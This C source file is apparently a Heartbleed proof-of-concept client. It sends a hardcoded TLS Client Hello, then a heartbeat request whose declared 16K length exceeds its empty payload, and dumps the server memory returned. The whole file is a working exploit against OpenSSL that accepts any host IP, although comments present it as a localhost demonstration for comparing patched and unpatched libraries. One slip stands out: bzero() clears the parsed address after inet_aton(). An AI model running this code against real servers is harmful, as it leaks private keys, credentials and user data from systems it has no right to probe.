

#include <stdio.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <openssl/ssl.h>
#include <openssl/ssl3.h>
 

static char *progName;

/*
 * TLS/SSL Record Header - payload specific to the record type follows
 * this header. Payload may be encrypted, compressed, and MAC protected.
 * Length of TLS/SSL packet is tls_length + 5 bytes which is the size of
 * the record header.Note below that if sizeof() is used to determine the
 * size of the record header, the result would be 6 bytes due to padding
 * added by the compiler. Consequently, the structure is used for reference
 * and not for encoding and decoding the record fields sent and received.
 */

struct tls_record_header
{
    char		tls_type;		// TLS/SSL record type
    char		tls_major;		// Major version - 3 = TLS v1.2
    char		tls_minor;		// Minor version - 3 = TLS v1.2
    unsigned int	tls_length;		// Payload length
    
    // encrypted, compressed (optional), and MAC protected payload //
};

#define TLS_RECORD_HEADER_SIZE	5

/*
 * TLS v1.2 Client Hello message - initiates handshake with SSL server
 */

#define TLS_HELLO_PACKET_LENGTH	225

static unsigned char tls_hello_packet[TLS_HELLO_PACKET_LENGTH] = 
{ 0x16,0x03,0x03,0x00,0xdc,0x01,0x00,0x00,0xd8,0x03,0x03,0x53,\
  0x43,0x5b,0x90,0x9d,0x9b,0x72,0x0b,0xbc,0x0c,0xbc,0x2b,0x92,0xa8,0x48,0x97,0xcf,\
  0xbd,0x39,0x04,0xcc,0x16,0x0a,0x85,0x03,0x90,0x9f,0x77,0x04,0x33,0xd4,0xde,0x00,\
  0x00,0x66,0xc0,0x14,0xc0,0x0a,0xc0,0x22,0xc0,0x21,0x00,0x39,0x00,0x38,0x00,0x88,\
  0x00,0x87,0xc0,0x0f,0xc0,0x05,0x00,0x35,0x00,0x84,0xc0,0x12,0xc0,0x08,0xc0,0x1c,\
  0xc0,0x1b,0x00,0x16,0x00,0x13,0xc0,0x0d,0xc0,0x03,0x00,0x0a,0xc0,0x13,0xc0,0x09,\
  0xc0,0x1f,0xc0,0x1e,0x00,0x33,0x00,0x32,0x00,0x9a,0x00,0x99,0x00,0x45,0x00,0x44,\
  0xc0,0x0e,0xc0,0x04,0x00,0x2f,0x00,0x96,0x00,0x41,0xc0,0x11,0xc0,0x07,0xc0,0x0c,\
  0xc0,0x02,0x00,0x05,0x00,0x04,0x00,0x15,0x00,0x12,0x00,0x09,0x00,0x14,0x00,0x11,\
  0x00,0x08,0x00,0x06,0x00,0x03,0x00,0xff,0x01,0x00,0x00,0x49,0x00,0x0b,0x00,0x04,\
  0x03,0x00,0x01,0x02,0x00,0x0a,0x00,0x34,0x00,0x32,0x00,0x0e,0x00,0x0d,0x00,0x19,\
  0x00,0x0b,0x00,0x0c,0x00,0x18,0x00,0x09,0x00,0x0a,0x00,0x16,0x00,0x17,0x00,0x08,\
  0x00,0x06,0x00,0x07,0x00,0x14,0x00,0x15,0x00,0x04,0x00,0x05,0x00,0x12,0x00,0x13,\
  0x00,0x01,0x00,0x02,0x00,0x03,0x00,0x0f,0x00,0x10,0x00,0x11,0x00,0x23,0x00,0x00,\
  0x00,0x0f,0x00,0x01,0x01
};


/* Buffer for Heartbeat request data to be returned by the SSL server */

static unsigned char heartbeat_buffer[65536];

/*
 * Used for TLS packet reference - can not be used to create
 * the header due to structure alignment by compiler. Header
 * must be created field by field.
 */

struct tls_heartbeat_record
{
    char		tls_type;		// TLS1_RT_HEARTBEAT
    char		tls_major;		// Major version - 3 = TLS v1.2
    char		tls_minor;		// Minor version - 3 = TLS v1.2
    unsigned int	tls_length;		// Payload length
    //  *** payload *** //
    char		tls_hb;			// Heartbeat request (1) or reply (2)
    unsigned int	tls_payload;		// Arbitrary data
    char		tls_padding[16];	// Mandatory padding - 16 bytes
};


/*
 * TLS Heartbeat packet - Type=24 (Heartbeat), Major/Minor version of TLS=3,3 (TLS v1.2)
 * Payload length (short) = 3, Payload = [ 0x01, 0x40, 0x00 ] = Heartbeat subtype REQUEST,
 * Heartbeat data length = 16K bytes. Note the packet does not actually contain 16K of
 * data but this is not verified by OpenSSL which is central to the Heartbleed vulnerability.
 */

#define TLS_HB_PACKET_LENGTH	8

#define TLS_HB_PAYLOAD_LENGTH	0x4000		// 16K (embedded in below packet) [16,384 bytes]

static unsigned char tls_heartbeat_packet[TLS_HB_PACKET_LENGTH] =
  { 0x18,0x03,0x03,0x00,0x03,0x01,0x40,0x00 };


#define PACKET_DUMP_COUNT	24

/*
 * Dump the contents of the Heartbeat, Client Hello, or Server Hello packets
 */
 
#define	DUMP_HEX_ONLY		0
#define DUMP_ASCII_ONLY		1
#define DUMP_BOTH		2

void
DumpTLSPacket(unsigned char *packet, int length, int ascii)
{
    char pbuf[(PACKET_DUMP_COUNT*3)+1];
    int n, p;

    /* Initialize and terminate the print buffer */

    for(n=0; n < PACKET_DUMP_COUNT*3; n++)
      pbuf[n] = ' ';
    
    pbuf[PACKET_DUMP_COUNT*3] = '\0';
    
    /* Handle special case for single line output */
    
    if(length < PACKET_DUMP_COUNT)
      printf("%s: packet [001-%03d]: ", progName, length);
    else
      printf("%s: packet [001-%03d]: ", progName, PACKET_DUMP_COUNT);

    /* Iterate over the packet printing in hex, ascii, or both */
    
    for(n=0, p=0; n < length; n++, p++)
    {
      int end;

      if((length - n) < PACKET_DUMP_COUNT)
	  end = n + (length - n);
      else
	  end = n + PACKET_DUMP_COUNT;

      if(n && ((n % PACKET_DUMP_COUNT) == 0))
      {
	  int c;
	  
	  /* Output the current buffer */
	  
	  if(ascii == DUMP_BOTH)
	  {
	    printf("%s", pbuf);
	    p = 0;			// reset pbuf[] index
	    
	    /* Copy spaces to the print buffer in case next iteration is a short buffer */
	  
	    for(c=0; c < PACKET_DUMP_COUNT*3; c++)
	      pbuf[c] = ' ';
	  }
	  
	  /* Header for the next print line of the packet */
	  
	  printf("\n%s: packet [%03d-%03d]: ", progName, n+1, end);
      }

      /* Hex and Ascii modes can print directly, must be buffered for both */
      
      switch(ascii)
      {
	case DUMP_HEX_ONLY:
	  printf("%02x", packet[n]);
	  break;
	  
	case DUMP_ASCII_ONLY:
	  if(isprint(packet[n]))
	    printf("%c", packet[n]);
	  else
	    printf(".");
	  break;
	
	case DUMP_BOTH:
	{
	   char hex[3], *hexp;
	  
	  /* Convert to hex in a temporary cell */
	  
	  sprintf(hex, "%02x", packet[n]);
	  
	  /* Move hex into the print buffer, do not use sprintf() since it inserts NULL */
	  
	  hexp = &pbuf[p*2];
	  *hexp++ = hex[0];
	  *hexp   = hex[1];
	  
	  /* Add ascii if printable character or '.' to the print buffer */
	  
	  if(isprint(packet[n]))
	    sprintf(&pbuf[p+(PACKET_DUMP_COUNT*2)], "%c", packet[n]);
	  else
	    sprintf(&pbuf[p+(PACKET_DUMP_COUNT*2)], ".");
	  break;
	}
      }
    }

    /* Handle the case for combined ascii/hex mode - not a full last buffer */
    
    if((ascii == DUMP_BOTH) && n && (n % PACKET_DUMP_COUNT))
    {
      pbuf[p+(PACKET_DUMP_COUNT*2)] = '\0';	// terminate the short print buffer
      printf("%s", pbuf);			// output the last line of the packet
    }
    
    printf("\n");
}

/*
 * Send a pre-formed Heartbeat (request) packet to the server. This request specifies
 * length field that exceeds the length of the data in the packet. If the server is
 * vulnerable to the HEARTBLEED attack, it will return the same length of data in the
 * response. Since the server does not validate the length field, the result is data
 * from server memory is returned in the response. If the server vulnerability has
 * been corrected, the request will be rejected as invalid since the length in the
 * request is not permitted to exceed the actual size of the data sent by the client
 * in the request.
 */
 
int SendTLSHeartbeatRequest(int server)
{
    unsigned char *tls_heartbeat;
    char type, subtype;
    int readCount = 0;
    int firstRead = 1;
    int payloadCount = TLS_HB_PAYLOAD_LENGTH;
    
    printf("%s: sending TLS heartbeat message to SSL server\n", progName);

    /* Dump out the HEARTBEAT packet */
    
    DumpTLSPacket(tls_heartbeat_packet, TLS_HB_PACKET_LENGTH, DUMP_HEX_ONLY);
    
    if(write(server, tls_heartbeat_packet, TLS_HB_PACKET_LENGTH) == -1)
    {
      printf("%s: error writing heartbeat message to SSL server - %d\n", progName, errno);
      return(0);
    }
    
    printf("%s: waiting on heartbeat responses from the SSL server\n", progName);

    while(readCount < payloadCount)
    {
      /* Get the HEARTBEAT response from the server */
		  
      readCount = read(server, heartbeat_buffer, sizeof(heartbeat_buffer));
      
      if(readCount == -1)
      {
	printf("%s: error on SSL_read() for heartbeat response - %d\n", progName, errno);
	return(0);
      }
      else if(readCount == 0)
	break;

      /*
       * If the readCount of data returned from the SSL server is larger than the payload
       * size specified in the Heartbeat request, the server is vulnerable to Heartbleed.
       */
    
      if(firstRead && (readCount > 3))
	printf("\n\n%s: ***** SSL server is vulnerable to HEARTBLEED ***** \n\n\n", progName);
      
      printf("%s: heartbeat response from the SSL server - %d bytes\n", progName, readCount);
      
      tls_heartbeat = &heartbeat_buffer[0];
      
      type = *tls_heartbeat;
      subtype = *(tls_heartbeat + TLS_RECORD_HEADER_SIZE);
      
      printf("%s: *** TLS/SSL record type [%s], subtype [%s] ***\n", progName,
	type == TLS1_RT_HEARTBEAT ? "TLS1_RT_HEARTBEAT" : "unknown",
	subtype == TLS1_HB_RESPONSE ? "TLS1_HB_RESPONSE" : "unknown");
      
      DumpTLSPacket(heartbeat_buffer, readCount, DUMP_BOTH);
      
      /* Decrement the read count from the expected payload length */
      
      if(readCount > payloadCount)
	payloadCount = 0;
      else
	payloadCount -= readCount;
      
      firstRead = 0;	// clear the read flag for detecting HEARTBLEED
    }
    
    /*
     * If the readCount of data returned from the SSL server is larger than the payload
     * size specified in the Heartbeat request, the server is vulnerable to Heartbleed.
     */

    if(firstRead && (readCount <= 0))
      printf("\n\n%s: ***** SSL server is NOT vulnerable to HEARTBLEED ***** \n\n", progName);
    
    printf("%s: complete heartbeat response received from the SSL server\n", progName);
    return(1);
}

/*
 * Send a "Client Hello' handshake message to the server to initiate a TLS
 * connection.
 */
 
int SendTLSClientHello(int server)
{
    printf("%s: sending TLS client hello message to SSL server\n", progName);

    /* Dump out the Client Hello packet */
    
    DumpTLSPacket(tls_hello_packet, TLS_HELLO_PACKET_LENGTH, DUMP_HEX_ONLY);
    
    if(write(server, tls_hello_packet, TLS_HELLO_PACKET_LENGTH) == -1)
    {
      printf("%s: error writing client hello message to SSL server - %d\n", progName, errno);
      return(0);
    }

    return(1);
}

/*
 * Handle return status from server read request.
 */

void HandleTLSServerReadResponse(int readCount)
{
    /* Handle SSL server read request errors - return if no error */
    
    if(readCount == -1)
    {
	printf("%s: error on read() for server hello responses - %d\n", progName, errno);
	exit(0);
    }
    else if(!readCount)
    {
	printf("%s: no data returned for server hello responses - %d\n", progName, errno);
	exit(0);
    }

    printf("%s: server hello responses from the SSL server - %d bytes\n", progName, readCount);
    return;
}

/*
 * Wait for the "Server Hello" response to the Client Hello message. This is the
 * server's reply to the initial handshake request.The server hello response is
 * in three parts (messages):
 * 
 * Message #1: Server Hello message type - SSL3_MT_SERVER_HELLO
 * Message #2: Server Certificate message type - SSL3_MT_CERTIFICATE
 * Message #3: Server Done message type - SSL3_MT_SERVER_DONE
 * 
 * Wait for these message types to be received before returning to initiate the
 * Heartbeat requests following which any responses will be Heartbeat responses.
 */

#define SERVER_HELLO_BUFFER_SIZE	1024

int GetTLSServerHello(int server)
{
    unsigned char server_hello_buffer[SERVER_HELLO_BUFFER_SIZE];
    unsigned char *tls_hello = &server_hello_buffer[0];
    unsigned char *tls_certificate, *tls_done;
    unsigned char type, major, minor, subtype;
    uint16_t recordLength, helloLength, certLength, doneLength;
    int readCount;

    printf("%s: waiting on server hello responses from the SSL server\n", progName);

    /* Get the Server Hello response from the server */
    
    readCount = read(server, server_hello_buffer, SERVER_HELLO_BUFFER_SIZE);

    HandleTLSServerReadResponse(readCount);
    
    /*
     * Verify that the buffer contains both the SSL3_MT_SERVER_HELLO message
     * and the SSL3_MT_CERTIFICATE messages in their entirety. Otherwise, read
     * the server connection until the remainder of the messages have been
     * returned to the client.
     */
    
    type =  *tls_hello++;		// SSL/TLS message type
    major = *tls_hello++;		// SSL/TLS major version
    minor = *tls_hello++;		// SSL/TLS minor version
    
    helloLength = ntohs(*((uint16_t *)tls_hello));
    
    subtype = *(tls_hello+2);		// SSL/TLS request subtype/function
    
    printf("%s: server hello response type [%s], major/minor [%d/%d], pkt length [%d]\n",
	   progName, type == SSL3_RT_HANDSHAKE ? "SSL3_RT_HANDSHAKE" : "unknown",
	   major, minor, helloLength+TLS_RECORD_HEADER_SIZE);
    printf("%s: *** TLS/SSL response subtype [%s] ***\n",
	   progName, subtype == SSL3_MT_SERVER_HELLO ? "SSL3_MT_SERVER_HELLO" : "unknown");
    
    /* Did we get the entire SSL3_MT_SERVER_HELLO packet? */
    
    while(readCount < (TLS_RECORD_HEADER_SIZE + helloLength))
    {
	unsigned char *readPtr;
	int readCnt;
	
	/* Did not get the entire SSL3_MT_SERVER_HELLO packet from the server */
	
	printf("%s: reading from SSL server for rest of SSL3_MT_SERVER_HELLO message\n", progName);
	
	readPtr = &server_hello_buffer[readCount];		// append data to read buffer
	readCnt = SERVER_HELLO_BUFFER_SIZE - readCount;		// reset read count
	
	/* Read more data from the server and append to the data already in read buffer */
	
	readCnt = read(server, readPtr, readCnt);

	printf("%s: server hello responses from the SSL server - %d bytes\n", progName, readCnt);
    
	HandleTLSServerReadResponse(readCnt);
	
	/* Increment the total read count in the buffer */
	
	readCount += readCnt;
    }
    
    /* Set record length for SSL3_MT_SERVER_HELLO record */
    
    recordLength = TLS_RECORD_HEADER_SIZE + helloLength;
    
    /* See if these is a complete SSL/TLS record header for next record in the buffer */
    
    if((readCount - recordLength) < TLS_RECORD_HEADER_SIZE)
    {
	unsigned char *readPtr;
	int readCnt;
	
	/* Do not have a complete SSL/TLS record header in the buffer */
	
	printf("%s: reading from SSL server for rest of SSL3_MT_CERTIFICATE message\n", progName);
	  
	readPtr = &server_hello_buffer[readCount];		// append data to read buffer
	readCnt = SERVER_HELLO_BUFFER_SIZE - readCount;		// reset read count
	
	/* Read more data from the server and append to the data already in read buffer */
	
	readCnt = read(server, readPtr, readCnt);

	printf("%s: server hello responses from the SSL server - %d bytes\n", progName, readCnt);
    
	HandleTLSServerReadResponse(readCnt);
	
	/* Increment the total read count in the buffer */
	
	readCount += readCnt;
    }
    
    /*
     * Next TLS/SSL record header is located at helloLength + TLS_RECORD_HEADER_SIZE
     * in the read buffer.This record should be the SSL3_MT_CERTIFICATE message from
     * the SSL server.
     */
    
    tls_certificate = &server_hello_buffer[recordLength];
    
    type =  *tls_certificate++;		// SSL/TLS message type
    major = *tls_certificate++;		// SSL/TLS major version
    minor = *tls_certificate++;		// SSL/TLS minor version
    
    certLength = ntohs(*((uint16_t *)tls_certificate));
    
    subtype = *(tls_certificate+2);	// SSL/TLS request subtype/function
    
    printf("%s: server hello response type [%s], major/minor [%d/%d], pkt length [%d]\n",
	   progName, type == SSL3_RT_HANDSHAKE ? "SSL3_RT_HANDSHAKE" : "unknown",
	   major, minor, certLength+TLS_RECORD_HEADER_SIZE);
    printf("%s: *** TLS/SSL response subtype [%s] ***\n",
	   progName, subtype == SSL3_MT_CERTIFICATE ? "SSL3_MT_CERTIFICATE" : "unknown");
    
    /* Set record length for SSL3_MT_SERVER_HELLO & SSL3_MT_CERTIFICATE records */
    
    recordLength += TLS_RECORD_HEADER_SIZE + certLength;
    
    /* See if these is a complete SSL/TLS record header for next record in the buffer */
    
    if((readCount - recordLength) < TLS_RECORD_HEADER_SIZE)
    {
	unsigned char *readPtr;
	int readCnt;
	
	/* Do not have a complete SSL/TLS record header in the buffer */
	
	printf("%s: reading from SSL server for rest of SSL3_MT_SERVER_DONE message\n", progName);
	  
	readPtr = &server_hello_buffer[readCount];		// append data to read buffer
	readCnt = SERVER_HELLO_BUFFER_SIZE - readCount;		// reset read count
	
	/* Read more data from the server and append to the data already in read buffer */
	
	readCnt = read(server, readPtr, readCnt);

	printf("%s: server hello responses from the SSL server - %d bytes\n", progName, readCnt);
    
	HandleTLSServerReadResponse(readCnt);
	
	/* Increment the total read count in the buffer */
	
	readCount += readCnt;
    }
    
    /*
     * Next TLS/SSL record header is located at packet_length + TLS_RECORD_HEADER_SIZE
     * in the read buffer relative to tls_certificate (current record).This record should
     * be the SSL3_MT_SERVER_DONE message from the SSL server completing the SSL/TLS handshake.
     */
    
    tls_done = &server_hello_buffer[recordLength];
    
    type =  *tls_done++;		// SSL/TLS message type
    major = *tls_done++;		// SSL/TLS major version
    minor = *tls_done++;		// SSL/TLS minor version
    
    doneLength = ntohs(*((uint16_t *)tls_done));
    
    subtype = *(tls_done+2);		// SSL/TLS request subtype/function
    
    printf("%s: server hello response type [%s], major/minor [%d/%d], pkt length [%d]\n",
	   progName, type == SSL3_RT_HANDSHAKE ? "SSL3_RT_HANDSHAKE" : "unknown",
	   major, minor, doneLength+TLS_RECORD_HEADER_SIZE);
    printf("%s: *** TLS/SSL response subtype [%s] ***\n",
	   progName, subtype == SSL3_MT_SERVER_DONE ? "SSL3_MT_SERVER_DONE" : "unknown");
    
    /*
     * Set record length for SSL3_MT_SERVER_HELLO, SSL3_MT_CERTIFICATE, and the
     * SSL3_MT_SERVER_DONE records
     */
    
    recordLength += TLS_RECORD_HEADER_SIZE + doneLength;
    
    /* Make sure we have all of the SSL3_MT_SERVER_DONE message in the buffer */
    
    if(readCount < recordLength)
      printf("%s: incomplete SSL3_MT_SERVER_DONE record in the read buffer [%d/%d]\n",
	     progName, readCount, recordLength);
      
    DumpTLSPacket(server_hello_buffer, readCount, DUMP_BOTH);
    
    return(1);
}

/*
 * Wait for the Server certificate message that is part of the handshake.
 */

int GetTLSServerCertificate(int server)
{
    unsigned char server_cert_buffer[1024];
    int readCount;

    printf("%s: waiting on server certificate response from the SSL server\n", progName);

    /* Get the Server certificate response from the server */
    
    readCount = read(server, server_cert_buffer, sizeof(server_cert_buffer));

    if(readCount == -1)
    {
	printf("%s: error on read() for server certificate response - %d\n", progName, errno);
	return(0);
    }
    else if(!readCount)
    {
	printf("%s: no data returned in server certificate response - %d\n", progName, errno);
	return(0);
    }

    printf("%s: server hello certificate from the SSL server - %d bytes\n", progName, readCount);
    
    DumpTLSPacket(server_cert_buffer, readCount, DUMP_BOTH);
    return(1);
}

/*
 * Open a socket connection to the SSL server and then connect to the server
 * on the specified port.
 */

int OpenTLSConnection(const char *hostaddr, int port)
{
    struct sockaddr_in addr;
    int sd;
 
    printf("%s: converting SSL server IP address [%s]\n", progName, hostaddr);
    
    /* Convert the host address in ASCII format */
    
    if(inet_aton(hostaddr, &addr.sin_addr) == -1)
    {
	printf("%s: error on inet_ntoa() - %d\n", progName, errno);
	return(0);
    }
    
    /* Create socket for client connection to server */
    
    sd = socket(PF_INET, SOCK_STREAM, 0);
    
    bzero(&addr, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    
    /* Connect to the server */
    
    if(connect(sd, (struct sockaddr*)&addr, sizeof(addr)) != 0 )
    {
	close(sd);
	printf("%s: error on connect() - %d\n", progName, errno);
	return(0);
    }
    
    return sd;
}
 
/*
 * main - invoke the SSL heartbeat client which will connect to the SSL server
 * on the specified (or default) port. Once the connection is made, the client
 * does not complete the TLS/SSL handshake which would result in any further
 * communication being subject to encryption/authentication but instead, the
 * client generates the HEARTBEAT request to the SSL server. The request is
 * constructed such that 16K bytes are specified in the payload but the actual
 * payload provided on the request is 0 bytes. If the server is vulnerable to
 * the HEARTBLEED attack, it will return the 16K bytes of data in the response.
 * This client can be run using the version of OpenSSL with the vilnerability
 * and using the library with the fix applied to demonstrate the results in
 * both cases.
 * 
 * ./ssl_heartbeat [-p port] [-h host_IP]
 * 
 * ./ssl_heartbeat (no arguments uses 127.0.0.1:2000)
 * 
 * Arguments:
 * 	-h 	specifies the host IP address (default is localhost for testing)
 * 	-p	specifies the SSl server port (default 2000)
 */

int main(int argc, char *argv[])
{
    int server;
    char buf[1024];
    int bytes;
    char *hostname;
    int portnum;
    int opt;
 
    /* Initialize default values for port and certificate/key file */

    progName = argv[0];
    portnum = 2000;			// default listener port
    hostname = "127.0.0.1";		// default hostname (localhost)

    /* Process command line arguments */

    while((opt = getopt(argc, argv, "h:p:c:")) != -1)
    {
      switch(opt)
      {
	case 'h':
	    hostname = optarg;
	    break;
		
	case 'p':
	    portnum = atoi(optarg);
	    break;
      }
    }

    /* Connect to the SSL server on the localhost at the specified port */
		
    server = OpenTLSConnection(hostname, portnum);
		
    if(!server)
	exit(1);
    
    printf("%s: SSL server connection established, fd [%d]\n", progName, server);
    
    /* Send "client hello" message to the SSL server - initiates handshake */
    
    if(!SendTLSClientHello(server))
    {	close(server);
	exit(1);
    }
    
    /* Wait for the "server hello" response to the initial handshake */
    
    if(!GetTLSServerHello(server))
    {
	close(server);
	exit(1);
    }
    
    /*
     * Once the "server hello" response is received, send the Heartbeat request to
     * the server without completing the handshake. Otherwise, the TLS session would
     * be established and encryption/message authentication would be in effect and
     * the fabricated Heartbeat requests would not succeed and any data returned by
     * the server would not be available to this client program in cleartext.
     */
		 
    if(!SendTLSHeartbeatRequest(server))
    {
	close(server);
	exit(1);
    }
    
    printf("%s: SSL client terminating\n", progName);
    
    close(server);         	/* close socket */
    
    exit(0);
}
